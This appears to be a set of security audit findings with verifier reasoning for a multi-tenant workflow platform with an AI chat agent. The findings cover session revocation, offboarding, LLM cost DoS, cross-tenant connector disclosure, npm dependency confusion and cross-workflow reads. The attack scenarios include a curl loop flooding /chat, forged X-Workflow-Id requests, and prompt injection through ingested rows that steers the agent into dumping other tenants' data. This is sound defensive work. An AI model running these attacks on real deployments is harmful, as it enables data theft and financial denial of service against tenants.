The self-service path DOES revoke (control-routes.ts:231), proving the omission is real and the fix exists in-codebase. I hunted for the one viable upstream mitigation — a server-side mustChangePassword gate — and it does not exist: grep shows mustChangePassword is only set (provisioning:133), read-and-returned to the client (control-routes:134/140/203), and cleared (control-routes:228). Neither resolveIdentity (authn/index.ts:75-107) nor resolveTenantContext (authn/index.ts:115-198) inspects it; the only identity gate is status === 'active' (authn/index.ts:82), which a reset does not change. The flag is a pure client-side UX redirect ('The client gates a must-change member into the change-password screen', control-routes.ts:202). Therefore a stolen bearer token keeps resolving to the target identityId with full role grants for up to 12h after an admin 'reset', delivering zero containment. No PDP check, sanitizer, NODE_ENV gate, or middleware defeats it. Could not refute.

title: No account-offboarding API: a member's membership, roles, and sessions cannot be revoked short of deleting the entire organization
cwe: CWE-862: Missing Authorization (lifecycle: no deprovisioning path)
description: The control plane exposes only ADD/GRANT lifecycle verbs and no per-member removal. The full route inventory of control-routes.ts has POST /v1/memberships (add), POST /v1/role-assignments (grant), POST /v1/members/:id/reset-password — but no DELETE /v1/memberships, no route to set PlatIdentity.status='disabled', and no DELETE /v1/role-assignments. provisioning/index.ts has addMembership/assignRole/ensureIdentity but no removeMembership, deactivateIdentity, or revokeRole (the only platOrgMembership.deleteMany calls are inside deleteOrganization at line 507 and removeLegacySystemOrg at 564 — whole-tenant teardown). Both gating checks that could neutralize a departed user are dead code from the API's perspective: resolveTenantContext filters memberships by `status: 'active'` (authn/index.ts:120) and resolveIdentity rejects `identity.status !== 'active'` (authn/index.ts:82,91,104), yet no endpoint can set either field to a non-active value. So a granted member's access can never be withdrawn individually.
attack_scenario: A contractor with an org membership + editor role leaves the company (or is compromised). The org admin wants to offboard exactly that one account. There is no API to delete the membership, disable the identity, or remove the role assignment, and no API to mass-revoke the user's sessions. The admin's only options are: (a) reset the password — which (per finding 1) does not kill the live session and still leaves membership+roles intact so the user can sign in again with any future credential, or (b) delete the whole organization, destroying every other member's access and all workflow data. The departed/compromised account therefore retains org membership, role grants, and any live 12h session indefinitely.
recommendation: Add org-admin-gated control-plane routes: DELETE /v1/memberships/:identityId (or set membership.status='suspended'), DELETE /v1/role-assignments/:id, and an identity-deactivation route (PlatIdentity.status='disabled'). Each must, in addition to the metadata change, revoke the target's live sessions (platSession.updateMany revokedAt) so offboarding is immediate, and each must be audited. Scope all to the caller's org (reject cross-org target ids like reset-password already does).
exploitability: Not reachable pre-auth or cross-tenant and not RCE. The exposure requires a member who was already granted org membership + a role (a departed contractor or a compromised low-priv editor account). The party who lacks the tool is the trusted org admin; the residual-access "attacker" is the departed/compromised member. Concrete impact for an on-prem Ericsson install: (a) a compromised editor's stolen live session cannot be individually revoked and survives up to 12h even after the admin resets the password (reset does not touch platSession) — the only immediate full cutoff is deleting the entire tenant; (b) a departed contractor's org membership and editor role grants persist indefinitely (no DELETE path), so if the subject is ever re-credentialed/re-invited the access auto-returns. Partial operational workarounds exist (a password reset eventually locks out a departed user who does not hold the new temp credential once their session expires; org-delete is the nuclear option), which is why this lands at medium rather than high despite the genuine incident-response gap.
verifier_reasoning: (confirmed) The missing-offboarding gap is real and the finding's claims all check out against the code. (1) The complete route inventory (grepped across all of src/) shows only additive lifecycle verbs: POST /v1/memberships (control-routes.ts:376), POST /v1/role-assignments (control-routes.ts:416), POST /v1/members/:id/reset-password (control-routes.ts:400). There is no DELETE /v1/memberships, no DELETE /v1/role-assignments, and no identity-deactivation/membership-suspension route anywhere. (2) provisioning/index.ts offers addMembership (104), assignRole (59), ensureIdentity (95) but no removeMembership/deactivateIdentity/revokeRole; the only platOrgMembership.deleteMany calls are whole-tenant teardown in deleteOrganization (507) and removeLegacySystemOrg (564). (3) The two enforcement checks that would neutralize a departed user — resolveTenantContext filtering memberships by status:'active' (authn/index.ts:120) and resolveIdentity/login rejecting identity.status!=='active' (authn/index.ts:82,91,104; control-routes.ts:190) — are reachable but no endpoint can set either field non-active, so they are dead from the API's perspective. (4) The only session-revoke-over-an-identity (platSession.updateMany revokedAt, control-routes.ts:231) lives in the SELF-service POST /v1/account/password handler and kills only the caller's own sessions; revokeSession (sessions.ts:72) only revokes the caller's own bearer token. No admin tool revokes a target member's sessions. (5) Admin reset-password does NOT revoke sessions — issueMemberCredential (provisioning/index.ts:125-144) updates only passwordHash+mustChangePassword, and resolveSession (sessions.ts:65-69) checks only revokedAt/expiresAt, so a live 12h session (SESSION_TTL_MS, sessions.ts:17) survives the reset. Net: an org admin cannot individually withdraw a granted member's membership, roles, identity, or live session; the only full cutoff is DELETE /v1/organizations (control-routes.ts:348), which destroys every other member and all workflow data. Not a false positive. || (confirmed) Every factual claim verifies. Full read of src/platform/http/control-routes.ts: the only member/role lifecycle verbs are additive — POST /v1/memberships (add, line 376), POST /v1/role-assignments (grant, line 416), POST /v1/members/:id/reset-password (line 400). The only DELETE routes in the whole control plane are DELETE /v1/organizations/:id (line 348) and DELETE /v1/workflows/:id (line 710); there is no DELETE /v1/memberships, no DELETE /v1/role-assignments/:id, and no identity-deactivation route. provisioning/index.ts exports addMembership/assignRole/ensureIdentity/issueMemberCredential but no removeMembership/deactivateIdentity/revokeRole; grep confirms every member-level platOrgMembership.deleteMany is whole-tenant teardown (deleteOrganization line 507) or legacy cleanup (removeLegacySystemOrg lines 564/581), and platRoleAssignment.deleteMany is only workflow/org cascade. The gating fields are live but unsettable: resolveTenantContext filters memberships by status:'active' (authn/index.ts:120) and resolveIdentity rejects identity.status!=='active' (authn/index.ts:82,91,104), yet no endpoint sets either non-active. I searched (Read + grep) for any upstream offboarding path — CLI, provisioning helper, or status-flip route — and found none, so there is no product mitigation that refutes the gap. Two caveats lower the severity vs the claimed 'high': (1) the finding's 'retains a live 12h session indefinitely' sub-claim is overstated — resolveTenantContext re-queries active memberships and resolveIdentity re-checks identity.status on every request (onRequest plugin), so a bearer token carries no standing org access; if the membership/identity could be flipped (even by manual SQL on an on-prem box), access is cut on the next request without the session-revocation the finding stresses (sessions.ts resolveSession re-validates each call). The genuine gap is solely 'no API to flip those fields / delete those rows.' (2) This is a trusted-operator deprovisioning gap, not an unprivileged/pre-auth/cross-tenant/RCE vector — the affected account was legitimately granted access and there is no privilege escalation. Per the rubric (trusted-operator/defense-in-depth = lower), it is medium.

title: Unbounded LLM cost & cross-tenant AI degradation: POST /chat has no rate-limit, no body discipline, and fans out to 14 Anthropic calls per request
cwe: CWE-770: Allocation of Resources Without Limits or Throttling
description: POST /chat is the most expensive endpoint in the app and the least defended. Its only validation is shape: `if (!Array.isArray(body.messages) || body.messages.length === 0) { return reply.code(400)... }` then `const result = await runAgentTurn(body.messages as any)`. There is NO guardData/PDP gate (unlike every /sim and /commands route), NO cap on the number or byte-size of messages, and NO per-identity or per-org request throttle. Each call enters agent.ts's loop `for (let iter = 0; iter < MAX_ITERATIONS; iter++)` with `MAX_ITERATIONS = 14`, and every iteration issues a full `client.messages.create({ model, max_tokens: 4096, ... system: SYSTEM_BLOCKS, tools: TOOLS, messages: updated })` — a large cached system prompt (the comment in system-prompt.ts calls Block 2 the 'full Qlerify workflow dump (large)'), 28 tools, and a message history that grows every turn. So ONE HTTP request bills up to 14 model calls (4096 output tokens each). server.ts builds Fastify with `Fastify({ logger: ... })` and sets no `bodyLimit`, so Fastify's 1 MiB default applies per message body, and `loginRateLimiter` (the only limiter in the codebase) is wired solely to /v1/auth/login — there is no @fastify/rate-limit dependency at all. anthropic.ts resolves the key as org-BYOK-or-platform-default: when an org has no `anthropicKeyCiphertext`, `getAnthropicClient()` falls back to `platformClient()` which uses the shared env `ANTHROPIC_API_KEY`, so spend (and any provider-side rate-limit/quota tripped by abuse) hits a key shared by every org that has not configured its own. Note the cost is incurred even for a powerless member: write tools are PDP-gated at tools.ts:384, but a denied tool returns `is_error`, which is fed back into `updated` and the loop continues (stop_reason stays tool_use), so a read-only viewer still drives the full 14-call fan-out.
attack_scenario: An ordinary low-privilege org member (any identity that resolves a tenant context — even a viewer) obtains a bearer token by logging in once, then scripts a loop: `for i in $(seq 1 N); do curl -s -H 'authorization: Bearer <token>' -H 'content-type: application/json' --data-binary @big.json https://host/chat & done`, where big.json is a ~1 MiB messages[] array ending in a prompt that coerces tool use ('call list/read tools repeatedly and keep going'). Each request fans out to up to 14 Anthropic calls; there is no throttle, so concurrency is bounded only by the attacker's machine. Against a per-org BYOK key this is sustained, unbounded financial DoS on that org's Anthropic bill. Against the shared platform default key (any org with no BYOK configured), the abuse exhausts the platform key's rate-limit/spend quota, degrading or disabling the chat assistant and all AI features for EVERY other tenant on that key — a cross-tenant availability + cost attack from a single low-privilege account.
recommendation: Add a per-identity/per-org request throttle to /chat (reuse the in-memory SlidingWindowLimiter pattern from rate-limit.ts, or register @fastify/rate-limit keyed on the resolved identity/org), and gate it with guardData on a chat/AI capability so viewers cannot drive paid model calls. Cap request size explicitly (set a small per-route bodyLimit for /chat, e.g. 64-256 KiB, instead of the 1 MiB default) and cap messages[] length and total token estimate before the first model call. Enforce a per-org spend/token budget using the usage accounting already returned by runAgentTurn (cacheCreation/cacheRead/input/output tokens) and reject when over budget. For platform-default-key callers, apply a much tighter quota (or require BYOK) so one tenant cannot exhaust the shared key for others.
exploitability: Requires one valid bearer token for any org membership — the lowest-privilege viewer suffices (read tools are ungated and denied write tools still keep the loop alive). Not pre-auth and not RCE. With no throttle, no body cap beyond 1 MiB, and up to 14×4096-token model calls per request, a single low-priv account scripts unbounded concurrent /chat requests: financial DoS on a BYOK org's Anthropic bill, and on the shared platform-default key, cross-tenant exhaustion of the shared quota/rate-limit that degrades or disables AI for every other no-BYOK org on the install. CORS origin:true does not matter for scripted bearer-token requests.
verifier_reasoning: (confirmed) All claims verified against source. (1) routes.ts:339-353 — POST /chat validates only `Array.isArray(body.messages)` then calls runAgentTurn; no guardData, unlike every /sim and /commands route. (2) No throttle: the sole limiter loginRateLimiter (rate-limit.ts:125) is used only at control-routes.ts:178/192/196 for /v1/auth/login; package.json has no @fastify/rate-limit; the only global onRequest hook (server.ts:47) sets CSP headers; tenant-plugin.ts:51 only authenticates. (3) server.ts:42 sets no bodyLimit → Fastify 1 MiB default per body, with no messages[] length/token cap before the first paid call. (4) agent.ts:14 MAX_ITERATIONS=14; agent.ts:37-47 issues a full client.messages.create (max_tokens 4096, large SYSTEM_BLOCKS, all TOOLS, growing history) each iteration → up to 14 model calls per HTTP request. (5) Only TOOL_WRITE_ACTIONS tools are PDP-gated (tools.ts:31-41,383-385); read tools are ungated, and a denied write is swallowed by runTool's catch (tools.ts:442) into an is_error tool_result that agent.ts:71-78 feeds back, keeping stop_reason=tool_use so even a read-only viewer drives the full fan-out. (6) anthropic.ts:62-70 falls back to platformClient() (shared env ANTHROPIC_API_KEY under one PLATFORM_SLOT) for any org lacking BYOK, so one no-BYOK tenant's abuse exhausts the shared key's quota and degrades AI for all other no-BYOK tenants. The only inaccuracy in the finding is harmless: /chat is NOT pre-auth (tenant-plugin.ts:51-71 is deny-by-default 401), which the finding itself acknowledges (attacker logs in first). The grep of all guardData call sites shows EVERY other state/resource-touching route gates with guardData (routes.ts:47,85,289,305,362,381,393,402,410,427,442; connector-routes; bc-routes; adapter-routes) — /chat alone has no capability gate. (2) The only rate limiter in the codebase is loginRateLimiter (src/platform/authn/rate-limit.ts:125), used solely at control-routes.ts:178 for /v1/auth/login; package.json has no @fastify/rate-limit and no global limiter is registered. (3) server.ts:41 builds `Fastify({ logger: ... })` with no bodyLimit, so the 1 MiB default applies per message body, and there is no cap on messages[] length or token estimate. (4) agent.ts:14,37-47 confirms the fan-out: `for (let iter = 0; iter < MAX_ITERATIONS=14; iter++)` each issuing `client.messages.create({ max_tokens: 4096, system: SYSTEM_BLOCKS, tools: TOOLS, messages: updated })`. (5) anthropic.ts:62-82/46-58 confirms the shared-key cross-tenant vector: when an org has no anthropicKeyCiphertext, getAnthropicClient falls back to platformClient() using the shared env ANTHROPIC_API_KEY. (6) tools.ts:377-384 gates only write tools (TOOL_WRITE_ACTIONS), and a denied write returns is_error that runAgentTurn (agent.ts:71-78) feeds back into `updated`, so even a read-only viewer keeps the loop going. The ONLY upstream guard is the tenant-plugin onRequest auth hook (tenant-plugin.ts:51-71) which 401s unauthenticated requests — but the finding correctly scopes the attack to an authenticated low-privilege member (even a viewer), so authentication does not refute it. No PDP gate, no throttle, no body discipline beyond the 1 MiB default exists; the vulnerability is real as described.

title: Ungated chat read-tools enumerate and disclose every tenant's connector code, credential field-names, presence and journal across the process-global registry
cwe: CWE-1230 Exposure of Sensitive Information Through Metadata / CWE-285 Improper Authorization
description:
list_connector_credentials, view_connector_code, get_connector_history, get_adapter_config and check_adapter_credential are NOT in TOOL_WRITE_ACTIONS, so runTool never calls guardData for them (tools.ts:383-385 gates only mapped write actions). They read the PROCESS-GLOBAL stores with no org/workflow filter:
  - handleListConnectorCredentials (tools.ts:751): listAdapters().filter(kind==='connector') — returns EVERY org's connector id, boundedContext, target and credential field-names. The registry is one global Map (registry.ts:6) that loadPacks fills from all sidecars across all tenants (loadPacks.ts:73-99).
  - handleViewConnectorCode (tools.ts:731): connectorInfo(id) + readConnectorCode(id) return another tenant's FULL connector source (which may embed endpoints, internal hostnames, query logic, table names and identifiers) plus its credential field-names — for any id, no ownership check.
  - get_connector_history → readDoc(id) (journal.ts, explicitly 'process-global', comment at top) returns another tenant's timestamped activity log and AI summary.
  - check_adapter_credential reveals whether an arbitrary connector's credential is present.
This is both the enumeration primitive that feeds the copy_connector_credentials theft above AND a standalone cross-tenant information-disclosure. Because ids are deterministic (slug('<bc>-<target>'), orchestrate.ts:111 / journal.ts:47), an attacker can even target a known org B connector blind, without enumeration.
attack_scenario: As any member of org A who can reach /chat, send: 'Show me the source code and history of the salesforce-account connector.' The agent calls view_connector_code('salesforce-account') and get_connector_history(...) against the global store and returns org B's connector source and journal verbatim — no break-glass, no membership in org B, no PDP decision recorded. Driven autonomously when the request text is injected via ingested rows or a journal note, the agent enumerates all connectors (list_connector_credentials) and dumps each org's code, leaking internal endpoints and the credential field shapes needed to weaponise the copy_connector_credentials chain.
recommendation: Route the connector read tools through the same tenant scoping as the Connectors tab: replace listAdapters() with connectorsInWorkflow(currentWorkflowId()) in handleListConnectorCredentials, and gate handleViewConnectorCode/handleGetConnectorHistory/handleGetAdapterConfig/handleCheckAdapterCredential on connectorInWorkflow(readSidecar(id), currentWorkflowId()) (404 otherwise). Treat connector reads as workflow.read (membership-scoped to the OWNING workflow), not globally-readable. Namespace the on-disk stores per (org, workflow) so cross-tenant ids cannot resolve.
exploitability: Authed-low-priv, cross-tenant. Requires any authenticated org member who can reach /chat (not pre-auth). That member can enumerate and dump every other workflow's/org's connector source code, credential field-name shapes, endpoints, credential-presence booleans, and activity journals across the shared process-global store, with no PDP decision recorded. Deterministic slug ids permit blind targeting of a known org B connector without enumeration, and because tool dispatch is autonomous over tool-results/ingested-rows/journal-notes it is prompt-injection-drivable. Secret credential VALUES are never returned (tools expose only field names/booleans), so this is cross-tenant disclosure of source code + metadata and the enumeration primitive for the separate copy_connector_credentials theft chain, not direct secret exfiltration — high rather than critical.

All stores are one fixed un-tenanted directory: QLERIFY_DIR=<repo>/.qlerify (src/ontology/model.ts:37) for sidecars (sidecar.ts:11) and journals (journal.ts:20), and CONNECTORS_DIR=$QLERIFY_DATA_DIR/connectors (runtime.ts:42) for code/creds — keyed only by deterministic slug('<bc>-<target>') (orchestrate.ts:111, journal.ts:47), so blind cross-org targeting works. The correctly-scoped Connectors-tab routes prove intent: they do connectorsInWorkflow(currentWorkflowId()).find(c=>c.id===id) and 404 on miss (src/http/connector-routes.ts:86-87,120-121,142-143); the chat tools omit exactly this. /chat (src/http/routes.ts:339) is auth-gated and ALS-bound by the tenant plugin (src/platform/http/tenant-plugin.ts:51-71), so it is reachable by any authenticated member, and the multi-tenant control plane shares one process across orgs — making the disclosure cross-org. The system-prompt 'only current workflow' guidance is not a boundary (tools.ts:29 explicitly says the server-side gate is the boundary) and is bypassable by a direct message or prompt injection (autonomous tool dispatch, agent.ts:65-78). || (confirmed) The finding is real and exploitable as described. (1) Authorization gap: runTool only calls guardData when TOOL_WRITE_ACTIONS[name] is set (src/chat/tools.ts:383-384); TOOL_WRITE_ACTIONS (tools.ts:31-42) excludes list_connector_credentials, view_connector_code, get_connector_history, get_adapter_config, check_adapter_credential, so no PDP decision is made for them. (2) Process/disk-global store: QLERIFY_DIR is one fixed path (src/ontology/model.ts:37); ADAPTERS_DIR=.qlerify/adapters (sidecar.ts:11) and JOURNAL_DIR=.qlerify/connector-journal (journal.ts:20) hold every org's connectors; listSidecars() reads the whole dir (sidecar.ts:32-44); loadPacks registers all of them into the single global Map (registry.ts:6, loadPacks.ts:73-99) with only a duplicate-collapse, never a per-workflow filter. (3) Read helpers do no ownership check: handleListConnectorCredentials (tools.ts:751) uses listAdapters() unfiltered; connectorInfo(id) (orchestrate.ts:240) and adapterCfg(id) (author.ts:16) call readSidecar(id) by arbitrary id; handleGetConnectorHistory→readDoc(id) reads the journal by arbitrary id. (4) Proof the gap is real: the legitimate Connectors tab scopes every op with connectorsInWorkflow(currentWorkflowId()) and 404s on non-owned ids (connector-routes.ts:34-36,86,120,142) — the chat tools omit exactly that scoping. (5) Reachability: /chat is not a public path (tenant-plugin.ts:35-48), so the caller is authenticated and bound to their OWN org+workflow (tenant-plugin.ts:51-71), but the reads ignore the bound context and resolve any id globally; ensureWorkflowModelLoaded (ontology-store.ts:237-247) only swaps the ontology model, never re-scopes the adapter registry. The journal header (journal.ts:13-14) and the MEMORY note connector-tenant-isolation-gap both acknowledge this as a known, still-open gap. No upstream guard, sanitizer, NODE_ENV gate, or unreachability defeats it — refutation fails.

title: Connector subsystem runs `npm install` of arbitrary, tenant-influenced package names from the host's default registry at runtime (dependency confusion / typosquat / version-float supply-chain compromise on the on-prem host)
cwe: CWE-1357: Reliance on Insufficiently Trustworthy Component; CWE-829: Inclusion of Functionality from Untrusted Control Sphere
description:
`buildConnector` (src/packs/connector/orchestrate.ts:185) calls `installDeps(gen.deps)` where `gen.deps = scanImports(<AI-generated connector code>)`. The AI code is produced from tenant-supplied `instructions`, and `scanImports` (runtime.ts:262) blindly extracts every bare ESM/`require` specifier and feeds the raw names into a live install:

```js
const args = ["install", ...missing, "--no-audit", "--no-fund", "--ignore-scripts", "--loglevel=error", "--save"];
const child = spawn("npm", args, { cwd: CONNECTORS_DIR, env: { PATH: process.env.PATH, HOME: process.env.HOME } });
```

There is NO package allowlist, NO version pin (names install `@latest`), NO committed `.npmrc`/registry enforcement (none exists in the repo or Dockerfile), and NO lockfile/integrity in the connector workspace (`ensureWorkspace` writes a `package.json` with empty `dependencies` and `--save` writes floating caret ranges). The deny-scan that blocks `node:net`/raw sockets (src/packs/codegen/deny-scan.ts:12) applies ONLY to the in-process authored adapter body, NOT to this full-power runtime path, which by design 'may import ANY npm package and speak ANY protocol'. The subsystem is ON by default (`connectorsEnabled()` defaults true, src/config/features.ts).

`--ignore-scripts` does block postinstall RCE, but the installed package's top-level module code still executes when the run child `import()`s it (runtime.ts RUNNER_SRC `await import(modUrl)`), and the run child's argv only adds FS confinement (`sandboxArgs`) + heap cap — the Node permission model does NOT gate raw network sockets, and the OS jail (bwrap) is opt-in and Linux-only (`QLERIFY_CONNECTOR_JAIL=bwrap`, default off). So a malicious package can open `node:net`/`node:dgram` sockets to egress, bypassing the `safeFetch` SSRF guard entirely.
attack_scenario: On the Ericsson on-prem host, an authenticated org member with connector access opens the Connectors UI and builds a connector with instructions that cause the generated module to `import` a package named like an internal Ericsson scope (e.g. `@ericsson-int/telemetry-sdk`) that exists only as a malicious squat on the public npmjs registry (dependency confusion). The host runs `npm install @ericsson-int/telemetry-sdk@latest` from its configured/default registry; when the connector is then test-run, the package's module-load code executes inside the run child, opens a raw TCP socket via `node:net` (not blocked by the FS-only permission model, no bwrap by default), and exfiltrates or pivots into the internal network. Because there is no version pin/lockfile in the workspace, the same vector also fires from a future malicious version of an otherwise-legitimate dependency.
recommendation: For the highest-security on-prem profile, default `connectorsEnabled()` to OFF (require explicit opt-in). When enabled: enforce a strict package allowlist before install, pin exact versions with a committed/lock-verified manifest (no `@latest`, no caret `--save`), point npm at the internal/mirror registry only via a baked `.npmrc` (`registry=` + `--ignore-scripts` is already set), and run the connector child under the bwrap (or equivalent seccomp/netns) jail by default so raw-socket egress is denied, not just FS. Add `node:net`/`node:dgram` denial to the runtime path or require explicit egress allowlisting.
exploitability: Requires an authenticated org member with connector.edit (org owner/editor role) on their own workflow — not pre-auth, not cross-tenant-without-auth. With that role, the actor builds a connector whose AI-generated module imports an attacker-controlled package name (internal-scope squat / typosquat / version-float of a legit dep). The on-prem host runs `npm install <name>@latest` from the default public registry (no allowlist/pin/.npmrc), then a routine adapter_dry_run import()s the connector and executes the dependency's module-load code in the run child. The child's FS is confined to the workspace and host secrets are stripped from env, but raw node:net/node:dgram sockets are NOT gated (bwrap default-off), so the code bypasses the safeFetch SSRF guard to egress/pivot into the internal Ericsson network and can read every tenant's connector credential file from the shared workspace and exfiltrate it. Dependency confusion also fires against a benign operator who merely names an internal-scope package.
verifier_reasoning: (confirmed) All load-bearing claims verified in code. codegen.ts:315 sets gen.deps = scanImports(AI-generated code); buildConnectorPrompt embeds tenant instructions (codegen.ts:53) and instructs the model "You MAY import ANY npm package" (codegen.ts:62). scanImports (runtime.ts:263-283) extracts every bare specifier with no allowlist, and installDeps (runtime.ts:303-304) runs the exact `spawn("npm", ["install", ...missing, "--no-audit","--no-fund","--ignore-scripts","--loglevel=error","--save"], {cwd: CONNECTORS_DIR, env:{PATH,HOME}})` cited — no version pin (installs @latest), no lockfile (ensureWorkspace writes empty deps, runtime.ts:196). No .npmrc/registry config exists anywhere in repo/Dockerfile/fly/entrypoint, so npm hits the public registry by default (dependency-confusion surface). The deny-scan (deny-scan.ts blocking node:net/node:dgram) is only invoked on the in-process authored body (adapter-ai.ts:75, authored.ts:40) and is NOT applied to this full-power path. At run time RUNNER_SRC does `await import(modUrl)` (runtime.ts:174), executing the malicious dependency's module-load code. sandboxArgs() only confines FS (--allow-fs-read/write=CONNECTORS_DIR, runtime.ts:68-72); the Node permission model does not gate sockets, so node:net/node:dgram egress bypasses the safeFetch SSRF guard (runtime.ts:149-161) entirely. The bwrap OS jail is default-off (runtime.ts:82, requires QLERIFY_CONNECTOR_JAIL=bwrap, not set in any deploy config) and Linux-only. connectorsEnabled() defaults true (features.ts:11). The shared CONNECTORS_DIR (per-tenant namespacing listed as unfinished residual, runtime.ts:24) plus --allow-fs-read over the whole dir lets a malicious dep read every org's *.cred.json and egress it via raw socket. The only correct mitigation present — guardData("connector.edit") at tools.ts:384 / action-map.ts:37 — requires an authenticated tenant with workflow edit rights, so it is NOT pre-auth and NOT cross-tenant-without-auth, but it does not address the supply-chain/egress defect at all. --ignore-scripts blocks postinstall RCE but not the module-load execution, as the finding states. || (refuted) The described install behavior is real, but the "high" severity is materially overstated and the exploit grants no privilege escalation. (1) Reachability is gated: every path to buildConnector→installDeps passes guardData("connector.edit") (src/chat/tools.ts:383-384 for the chat tool, line 38 maps build_connector→connector.edit; HTTP build/ingest at src/http/routes.ts:289 and src/http/bc-routes.ts:157). guardData (src/platform/authz.ts:45-60) calls requireTenant() (fails closed off-request) then authorize() (src/platform/pdp/index.ts). authorize enforces the tenant boundary resource.org===ctx.org (index.ts:138, cross-org DENY) and requires permission "edit" for connector.edit (action-map.ts:37), granted only to owner/org_admin/editor or an edit/administer share (index.ts:163,205). A viewer or grantless member is denied. So the actor is an authenticated, same-org, workflow-edit-privileged operator — NOT pre-auth, NOT cross-tenant. (2) No escalation: the claimed impact (malicious package opens node:net/node:dgram raw sockets and egresses, bypassing safeFetch) is achievable by that same edit operator WITHOUT any supply-chain trick — node:net/dgram are builtins inside the sandbox, ungated by the FS-only permission model and outside the deny-scan; the code documents this residual at runtime.ts:74-79 and safeFetch (RUNNER_SRC 149-161) only ever guarded the injected fetch, never raw sockets. A typosquat adds zero capability. (3) The dangerous host-RCE interpretation is mitigated: installDeps runs the npm child with --ignore-scripts and a secret-stripped PATH+HOME env (runtime.ts:303-304), so pre/postinstall code cannot run and cannot read PLATFORM_ENCRYPTION_KEY/ANTHROPIC_API_KEY/DATABASE_URL; the package's module-load code runs only in the sandboxed run child whose env is PATH/HOME/NODE_OPTIONS="" with FS confined to CONNECTORS_DIR (runtime.ts:360-364, 41-42, 66-72). (4) A central kill switch already exists (the finding's own top recommendation): QLERIFY_CONNECTORS_ENABLED=false disables the subsystem, enforced in guardData (authz.ts:49) and at the runConnector chokepoint (runtime.ts:349), documented in src/config/features.ts:10-13. The hardening recommendations (pin/allowlist/baked .npmrc/bwrap-by-default) are valid defense-in-depth, but this is trusted-operator-only, not an exploitable escalation.

title: Within-org cross-workflow data-plane reads bypass the PDP: X-Workflow-Id is a user-controlled key with no role check, the 'workflow.read' permission is never enforced, and the disclosure is unaudited
cwe: CWE-639 Authorization Bypass Through User-Controlled Key (also CWE-862 Missing Authorization)
description: Every data-plane READ endpoint is gated by NOTHING but org membership plus the caller-supplied X-Workflow-Id header. The active workflow is bound in resolveTenantContext: `const proj = await prisma.platWorkflow.findFirst({ where: { id: workflowSelector, organizationId: org.id }, select: { id: true } }); workflowId = proj?.id;` (src/platform/authn/index.ts:176-179). This validates ONLY that the selected workflow belongs to the caller's org — it never checks the caller holds any role on THAT workflow. Role assignments can legitimately be workflow-scoped (`ScopeType` includes "workflow"; PlatRoleAssignment / assignRole carry scopeType="workflow", scopeId=workflowId; the delete cascade at src/platform/provisioning/index.ts:220 removes `scopeType: "workflow"` assignments), so a member can hold viewer on workflow A only. The read handlers then disclose workflow B's data because they never authorize: (a) the permission that should gate them is dead code — `"workflow.read": "view"` is defined in src/platform/pdp/action-map.ts:33 but a repo-wide grep shows it is never passed to guardData()/authorize(); every guardData call site is a write/administer/connector action. (b) The handlers call no PDP at all: src/http/routes.ts GET /sim/event-log (line 156, returns `prisma.eventLog.findMany({ where: ...eventLogOrgWhere() })`), /sim/cases (357), /sim/instance/:id (200), /sim/meta (169), /sim/flow-by-case (233), /sim/flow-aggregate (206), and GET /api/ontology (139) only read the ALS-bound context. eventLogOrgWhere() (src/platform/tenancy/event-scope.ts:21) returns `{ workflowId: currentWorkflowId(), organizationId: currentOrgId() }` — both taken from the attacker-selected context, so it happily returns workflow B's full event log. (c) Business rows leak the same way: src/twin/projection-store.ts scopes findMany/findById ONLY by org (`orgFilterSql` -> `organization_id = currentOrgId()`, line 74-77) while the physical table is chosen by `physPrefix()` from `currentWorkflowId()` (line 39-47) — i.e. the row filter never constrains to a workflow the caller is entitled to, it just reads gen__p<B>_* tables. GET /api/bc/:bc/raw (src/http/bc-routes.ts:173) and /api/bc/:bc/row-events (189) and /api/bc/:bc/history (259) are ungated and dump those rows. (d) The model body leaks: GET /v1/workflow/model/content (src/platform/http/control-routes.ts:768) and /v1/workflow/model/status (740) only call requireTenant() and return `currentContent(ctx.organizationId, ont.id)` for ctx.workflowId=B — no PDP. (e) Connector configuration leaks: GET /api/connectors (src/http/connector-routes.ts:32) has no guardData and returns each connector's credentialKeys (credential field names), endpoint, summary, journal notes, and row counts for workflow B. Because guardData() is the ONLY audit hook on the data plane (src/platform/authz.ts ensureAllowed -> recordAudit), none of these cross-workflow reads write an audit row, so the snooping is invisible. NOTE the asymmetry confirming intent: the corresponding WRITE/lifecycle endpoints (PUT /v1/workflow/model, restore, reload, /sim/* writes, connector edits) DO gate via ensureAllowed/guardData — only reads were left open.
attack_scenario: Ericsson on-prem: one organization 'ericsson-ran' spans several teams, each with its own workflow. Alice is an org member granted viewer scoped to workflow A only (scopeType="workflow", scopeId=A) — she has no role on workflow B (a different team's sensitive workflow in the same org). Alice authenticates normally (real session token), then issues: `GET /sim/event-log` with headers `Authorization: Bearer <her session>`, `X-Org-Id: ericsson-ran`, `X-Workflow-Id: <workflow-B-id>`. resolveTenantContext confirms B is in her org and binds workflowId=B with no role check; the handler returns B's entire append-only event log (actors, caseIds, payload fields, business timestamps). She repeats with the same X-Workflow-Id against `GET /sim/cases`, `GET /api/bc/:bc/raw` (B's real business data rows), `GET /v1/workflow/model/content` (B's full Qlerify model JSON / proprietary process design), and `GET /api/connectors` (B's connector endpoints + credential field-names + journal). Every call returns full data with HTTP 200, no PDP denial, and writes zero audit rows — defeating the need-to-know separation between teams that workflow-scoped roles were supposed to enforce.
recommendation: Treat reads as authorization decisions, not just membership-scoped queries. Either (1) call `await guardData("workflow.read")` at the top of every data-plane read handler listed above (/sim/* GETs, /api/ontology, /api/bc/* GETs, GET /api/connectors, /v1/workflow/model/{content,status}) so the existing PDP enforces a view grant on the active workflow and audits the access — this finally wires up the already-defined `workflow.read` permission; and/or (2) in resolveTenantContext, after validating X-Workflow-Id is in the org, additionally verify the caller has at least `view` on that workflow's containment chain before binding it (reject/fall back otherwise). Option (1) is preferred because it also closes the audit gap (read accesses become recordAudit rows). Remove `workflow.read` from action-map only if you deliberately keep reads membership-scoped — but for the Ericsson need-to-know bar, do not.
